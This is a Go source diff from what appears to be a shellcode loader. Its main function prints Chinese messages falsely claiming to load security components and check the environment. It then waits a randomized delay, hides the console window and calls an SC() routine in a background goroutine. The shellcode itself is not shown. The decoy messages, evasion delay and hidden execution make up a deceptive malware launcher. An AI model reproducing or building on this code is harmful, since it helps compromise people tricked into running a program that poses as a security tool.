@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"sync"
 	"time"
 )
 
@@ -11,18 +12,22 @@ var (
 )
 
 func main() {
-	fmt.Println("[+] 加载安全组件")
-	fmt.Println("[+] 环境检查")
+	//Welcome
+	fmt.Println("[√] 成功加载安全组件")
+	fmt.Println("[√] 检查运行环境...")
 	time.Sleep(time.Second * time.Duration(2+time.Now().Unix()%5))
-	fmt.Println("[+] 完成即将关闭窗口")
-	window(console)
+	fmt.Println("[√] 完成,即将关闭窗口")
+	time.Sleep(time.Second * 3)
 
-	stop := make(chan bool, 1)
+	hide(console)
+	wg := sync.WaitGroup{}
+	wg.Add(1)
 	go func() {
-		fmt.Println("[+] call sc")
+		fmt.Println("[+] Call SC")
 		SC()
+		fmt.Println("[+] Bye~")
 	}()
-	<-stop
+	wg.Wait()
 }
 
 func initialize() {
